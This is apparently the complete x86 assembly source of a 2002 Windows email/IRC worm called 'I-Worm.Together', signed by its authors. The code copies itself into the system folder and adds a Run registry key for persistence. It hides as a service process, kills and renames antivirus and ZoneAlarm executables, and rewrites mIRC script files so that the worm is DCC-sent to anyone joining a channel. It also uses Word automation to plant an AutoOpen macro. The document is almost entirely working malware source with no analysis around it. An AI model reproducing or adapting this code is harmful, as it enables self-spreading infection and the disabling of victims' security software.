comment #
Name : I-Worm.Together
Author : PetiK
Date : March 10th 2002
Size : 

Action :
#

.586p
.model flat
.code

JUMPS

api macro a
extrn a:proc
call a
endm

DISPPARAMS STRUC
    Arguments   DD      0           ;Array of arguments.
    Disp_IDs    DD      0           ;Dispatch ID's of named arguments.
    Argument_Count  DD      0           ;Number of arguments.
    Disp_ID_Count   DD      0           ;Number of dispatcher IDs.
DISPPARAMS ENDS

PROCESSENTRY32 STRUCT
       dwSize              DWORD ?
       cntUsage            DWORD ?
       th32ProcessID       DWORD ?
       th32DefaultHeapID   DWORD ?
       th32ModuleID        DWORD ?
       cntThreads          DWORD ?
       th32ParentProcessID DWORD ?
       pcPriClassBase      DWORD ?
       dwFlags             DWORD ?
       szExeFile           db 260 dup(?)
PROCESSENTRY32 ENDS

include Useful.inc

start_worm: call    hide_worm

twin_worm:
    push    50
    mov esi,offset orig_worm
    push    esi
    push    0
    api GetModuleFileNameA          ; esi = name of file

    push    50
    push    offset verif_worm
    api GetSystemDirectoryA
    @pushsz "\EBASE64.EXE"
    push    offset verif_worm
    api lstrcat

    mov edi,offset copy_worm
    push    edi
    push    50
    push    edi
    api GetSystemDirectoryA
    add edi,eax
    mov eax,"aBe\"
    stosd
    mov eax,"46es"
    stosd
    mov eax,"exe."
    stosd
    pop edi                 ; edi = %system%\eBase64.exe

    push    offset orig_worm
    push    offset verif_worm
    api lstrcmp
    test    eax,eax
    jz  end_fuck_antivirus
;   jz  continue_worm

    push    0
    push    edi
    push    esi
    api CopyFileA               ; copy file

    push    20
    push    edi
    push    1
    @pushsz "Encode Base64"
    @pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
    push    80000002h
    api SHSetValueA             ; regedit

    mov eax,offset sysTime
    push    eax
    api GetSystemTime
    lea eax,sysTime
    cmp word ptr [eax+6],10 ; 10th.
    jne end_worm
    push    40h
    @pushsz "I-Worm.Together"
    call    @mes
    db  "This worm was coded by PetiK",CRLF
    db  "100% French - (c)2002",0
    @mes:
    push    0
    api MessageBoxA
    jmp end_worm

continue_worm:

fuck_antivirus:
    @pushsz "OIFIL400.DLL"
    api LoadLibraryA
    test    eax,eax
    jz  end_fuck_antivirus

    push    0
    push    2
    api CreateToolhelp32Snapshot

    mov lSnapshot, eax

    inc eax
    jz  end_fuck_antivirus

    lea eax,uProcess
    mov [eax.dwSize], SIZE PROCESSENTRY32

    lea eax,uProcess
    push    eax
    push    lSnapshot
    api Process32First

checkfile:
    test    eax, eax
    jz  InfExpRetCl
    push    ecx

    mov eax,ProcessID
    push    offset uProcess
    cmp eax,[uProcess.th32ProcessID]
    je  NextFile

    lea ebx,[uProcess.szExeFile]

verif   macro   verifname,empty
        local   name
        ifnb    <empty>
        %out    too much arguments in macro 'nxt_instr'
        .err
        endif
        call    name
        db  verifname,0
        name:
        push    ebx
        api lstrstr
        test    eax,eax
endm

    verif   "ARG"           ; Norton
    jnz term
    verif   "AVP32.EXE"     ; AVP
    jnz term
    verif   "AVPCC.EXE"     ; AVP
    jnz term
    verif   "AVPM.EXE"      ; AVP
    jnz term
    verif   "WFINDV32.EXE"      
    jnz term
    verif   "F-AGNT95.EXE"      ; F-SECURE
    jnz term
    verif   "NAVAPW32.EXE"      ; Norton
    jnz term
    verif   "NAVW32.EXE"        ; Norton
    jnz term
    verif   "NMAIN.EXE"
    jnz term
    verif   "PAVSHED.EXE"       ; PandaSoftware
    jnz term
    verif   "vshwin32.exe"      ; McAfee
    jnz term
    verif   "PETIKSHOW.EXE"     ; McAfee
    jnz term
    
    @pushsz "ZONEALARM.EXE"
    push    ebx
    api lstrstr
    test    eax,eax
    jz  NextFile

term:   push    [uProcess.th32ProcessID]
    push    1
    push    001F0FFFh
    api OpenProcess
    test    eax,eax
    jz  NextFile
    push    0
    push    eax
    api TerminateProcess

    push    ebx
    push    offset new_name
    api lstrcpy
    mov esi,offset new_name
    push    esi
    api lstrlen
    add esi,eax
    sub esi,4
    mov [esi],"ktp."
    lodsd
    mov [esi],"kmz."
    lodsd

    push    0
    push    offset new_name
    push    ebx
    api CopyFileA
    push    ebx
    api DeleteFileA

NextFile:
    push    offset uProcess
    push    lSnapshot
    api Process32Next
    jmp checkfile

InfExpRetCl:
    push    lSnapshot
    api CloseHandle
end_fuck_antivirus:

call    Spread_Mirc

    push    0
    push    0
    api CoInitializeEx
    test    eax,eax
    jne end_worm

    push    eax
    push    1
    push    eax
    push    eax
    api CreateEventA
    test    eax,eax
    je  end_ole_com
    mov [hEvent],eax

    xor eax,eax
    push    offset tmpt
    push    eax
    push    eax
    push    offset Thr_Wrd
    push    eax
    push    eax
    api CreateThread
    test    eax,eax
    je  end_worm
    mov [hThreadWord],eax
    xchg    eax,esi

    push    -1
    push    1
    push    offset hThreadWord
    push    2
    api WaitForMultipleObjects
    push    [hEvent]
    push    esi
    api CloseHandle
    end_ole_com:
    api CoUninitialize

end_worm:
    push    0
    api ExitProcess

hide_worm   Proc
    pushad
    @pushsz "KERNEL32.DLL"
    api GetModuleHandleA
    xchg    eax,ecx
    jecxz   end_hide_worm
    @pushsz "RegisterServiceProcess"        ; Registered as Service Process
    push    ecx
    api GetProcAddress
    xchg    eax,ecx
    jecxz   end_hide_worm
    push    1
    push    0
    call    ecx
    end_hide_worm:
    popad
    ret
hide_worm   EndP

Spread_Mirc Proc
    push    offset copy_worm
    push    offset mirc_exe
    api lstrcpy
    call    @mirc
    db  "C:\mirc\script.ini",0
    db  "C:\mirc32\script.ini",0        ; spread with mIRC. Thanx to Microsoft.
    db  "C:\progra~1\mirc\script.ini",0
    db  "C:\progra~1\mirc32\script.ini",0
    @mirc:
    pop esi
    push    4
    pop ecx
    mirc_loop:
    push    ecx
    push    0
    push    80h
    push    2
    push    0
    push    1
    push    40000000h
    push    esi
    api CreateFileA
    mov ebp,eax
    push    0
    push    offset byte_write
    @tmp_mirc:
    push    e_mirc - s_mirc
    push    offset s_mirc
    push    ebp
    api WriteFile
    push    ebp
    api CloseHandle
    @endsz
    pop ecx
    loop    mirc_loop
    end_spread_mirc:
    ret
Spread_Mirc EndP

Thr_Wrd     Proc
    pushad
    @first_word:
    mov esi,offset word_obj
    push    esi
    push    0
    push    offset word_CLSID
    api GetActiveObject
    test    eax,eax
    jne @first_word

    push    eax
    push    80h
    push    2
    push    eax
    push    eax
    push    40000000h
    call    @io
@iof    db  'C:\IO.SYO',0
;@iof:  dw  'C',':','\','I','O','.','S','Y','O',0
    @io:
    api CreateFileA
    inc eax
    jz  @end_word
    dec eax
    cdq
    xchg    eax,ebp
    push    edx
    push    offset byte_write
    push    end_macro - s_macro
    push    offset s_macro
    push    ebp
    api WriteFile
    push    ebp
    api CloseHandle

    mov ebx,offset word_dispatcher
    push    ebx
    push    offset word_interface
    lodsd
    push    eax
    mov eax,[eax]
    call    [eax]
    test    eax,eax
    jne @end_word

;   push    -1
;   push    [hEvent]
;   api WaitForSingleObject

    mov ebx,[ebx]
    push    8
    pop edx
    call    DispApi_Get
    jne @end_word

    push    63h
    pop edx
    call    DispApi_Get
    jne @end_word

    push    87h
    pop edx
    call    DispApi_Get
    jne @end_word
    mov edi,ebx

    push    0Ah
    pop edx
    call    DispApi_Get
    dec ebx
    jne @end_word

    inc dword ptr [dispatch_param.Argument_Count]
    mov dword ptr [dispatch_param.Arguments],offset var_arg
    mov [arg_union],offset @iof

    push    0Dh
    pop edx
    mov ebx,edi
    call    DispApi 

    @end_word:
    popad
    push    [hEvent]
    api SetEvent
    push    0
    api ExitThread
Thr_Wrd     EndP


DispApi:push    1
    jmp d2
DispApi_Get Proc
    push    2
d2: pop eax
    push    0
    push    0
    push    offset var_result
    push    offset dispatch_param
    push    eax
    push    800h
    push    offset IID_NULL
    push    edx
    push    ebx
    mov eax,[ebx]
    call    [eax+18h]
    mov ebx,dword ptr [result_union]
    test    eax,eax
    ret
DispApi_Get EndP

.data
; === Copy Worm ===
orig_worm   db 50 dup (0)
copy_worm   db 50 dup (0)
verif_worm  db 50 dup (0)
sysTime     db 16 dup(0)

; === Fuck AntiVirus ===
uProcess    PROCESSENTRY32 <?>
ProcessID   dd ?
lSnapshot   dd ?
new_name    db 100 dup (?)

; === Spread With mIrc ===
s_mirc: db "[script]",CRLF
    db ";Don't edit this file.",CRLF,CRLF
    db "n0=on 1:JOIN:{",CRLF
    db "n1= /if ( $nick == $me ) { halt }",CRLF
    db "n2= /.dcc send $nick "
mirc_exe    db 50 dup (?)
    db CRLF,"n3=}",0
e_mirc:
byte_write  dd ?

; === Word ===
tmpt        dd ?
hThreadWord dd ?
hEvent      dd ?
word_obj    dd ?
word_dispatcher dd ?
dispatch_param  dq ?,?
IID_NULL    dq ?,?

var_result  dw 8
        dw ?
        dd ?
result_union    dq ?

var_arg     dw 8
        dw ?
        dd ?
arg_union   dd ?,?

s_macro:db 'Sub AutoOpen()',CRLF
    db 'On Error Resume Next',CRLF
    db 'MsgBox "Hello Connard.",vbinformation,"To "&Application.UserName',CRLF
    db 'End Sub',CRLF
end_macro:


word_CLSID  dd 000209FFh,0
        db 0C0h,0,0,0,0,0,0,46h
word_interface  dd 00020400h,0
        db 0C0h,0,0,0,0,0,0,46h


signature   db "I-Worm.Together "
author      db "Coded by PetiK and ZeMacroKiller - 2002",00h

end start_worm
end
